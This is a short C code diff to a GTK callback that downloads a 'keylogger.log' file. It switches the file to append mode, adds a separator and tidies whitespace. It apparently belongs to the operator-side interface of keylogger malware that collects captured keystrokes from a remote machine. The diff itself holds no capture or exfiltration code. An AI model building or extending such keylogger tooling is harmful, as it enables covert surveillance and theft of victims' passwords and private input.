@@ -244,7 +244,7 @@ void cb_download_log_file(GtkButton *button, gpointer user_data)
         }     
     }
 
-    log_file = fopen("keylogger.log", "w");
+    log_file = fopen("keylogger.log", "a");
     if(log_file == NULL)
     {
         perror("log_file ");
@@ -322,6 +322,8 @@ void cb_download_log_file(GtkButton *button, gpointer user_data)
         return;
     }
     
+    fputs("\n\n", log_file);
+    
     
     do
     {
@@ -343,8 +345,7 @@ void cb_download_log_file(GtkButton *button, gpointer user_data)
     }while(totalRcv < data_len);
     
     printf("Log receive with success : %ld\n", totalRcv);
-   
-    
+
     /* Obtaining the buffer associated with the widget. */
     text_buffer = gtk_text_view_get_buffer((GtkTextView*)text_view);
 
